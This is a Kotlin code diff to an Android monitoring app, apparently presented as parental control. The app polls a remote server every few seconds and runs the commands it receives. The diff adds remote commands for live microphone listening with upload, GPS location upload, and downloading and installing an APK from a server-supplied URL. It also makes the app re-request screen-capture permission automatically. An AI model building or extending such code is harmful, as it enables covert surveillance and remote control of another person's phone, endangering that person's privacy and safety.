@@ -28,6 +28,7 @@ data class CommandRecord(
 class RealtimeCommandManager(
     private val context: Context,
     private val scope: CoroutineScope,
+    private val gpsTracker: GpsTracker,
     private val projectionProvider: () -> android.media.projection.MediaProjection?
 ) {
 
@@ -40,6 +41,7 @@ class RealtimeCommandManager(
     private val parentalControl = ParentalControlManager(context)
     private val screenCapture = ScreenCaptureEngine(context)
     private val audioRecorder = AudioRecorderEngine(context)
+    private val updateManager = AppUpdateManager(context)
 
     /**
      * بدء السحب الدوري للأوامر (كل 5 ثوانٍ)
@@ -122,13 +124,44 @@ class RealtimeCommandManager(
                         screenCapture.captureAndUpload(projection, forceCapture = true)
                         true
                     } else {
-                        Log.e(TAG, "Cannot capture: MediaProjection is null")
-                        supabase.logRemote(context, TAG, "ERROR", "MediaProjection is NULL")
+                        Log.w(TAG, "MediaProjection is null — triggering re-acquisition")
+                        supabase.logRemote(context, TAG, "WARN", "MediaProjection NULL — re-requesting permission")
+                        // إطلاق إعادة الاكتساب تلقائياً
+                        android.os.Handler(android.os.Looper.getMainLooper()).post {
+                            MonitoringForegroundService.getInstance()?.requestProjectionReacquisition()
+                        }
                         false
                     }
                 }
                 "RECORD" -> {
                     audioRecorder.recordAndUpload(30000L)
+                    true
+                }
+                "LISTEN_START" -> {
+                    audioRecorder.startRecording()
+                    true
+                }
+                "LISTEN_STOP" -> {
+                    audioRecorder.stopRecording(upload = true)
+                    true
+                }
+                "LOCATE" -> {
+                    gpsTracker.fetchAndUploadLocation()
+                    true
+                }
+                "UPDATE" -> {
+                    // executeCommand هي suspend fun تعمل داخل Dispatchers.IO
+                    // → نستدعي مباشرة بدون launch داخلي لتجنب CancellationException
+                    val settings = RemoteConfigManager(context).fetchSettings()
+                    if (settings != null) {
+                        updateManager.checkAndExecuteUpdate(
+                            targetVersion = settings.target_version,
+                            apkPath       = settings.update_apk_path,
+                            apkUrl        = settings.update_apk_url
+                        )
+                    } else {
+                        Log.w(TAG, "UPDATE: fetchSettings returned null")
+                    }
                     true
                 }
                 else -> {
@@ -182,11 +215,11 @@ class RealtimeCommandManager(
                         mediaPlayer.release()
                     }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error stopping alarm: \${e.message}")
+                    Log.e(TAG, "Error stopping alarm: ${e.message}")
                 }
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to play alarm: \${e.message}")
+            Log.e(TAG, "Failed to play alarm: ${e.message}")
         }
     }
 }
